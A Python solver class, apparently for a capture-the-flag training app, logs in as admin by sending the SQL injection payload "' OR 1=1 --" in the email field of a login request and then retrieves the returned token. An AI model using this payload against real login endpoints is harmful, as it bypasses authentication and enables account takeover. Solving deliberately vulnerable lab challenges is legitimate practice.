from core.base_solver import BaseSolver
from loguru import logger

class LoginAdminSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "loginAdminChallenge"

    def solve(self) -> bool:
        # SQL Injection to log in as admin
        payload = {
            "email": "' OR 1=1 --",
            "password": "anything"
        }
        
        res = self.client.post("/rest/user/login", json=payload)
        
        if res.status_code == 200:
            data = res.json()
            token = data.get("authentication", {}).get("token")
            if token:
                logger.info("Successfully logged in via SQLi. Token retrieved.")
                # Optionally set the token for future requests if we wanted to maintain state
                # self.client.session.headers.update({"Authorization": f"Bearer {token}"})
                return True
        return False
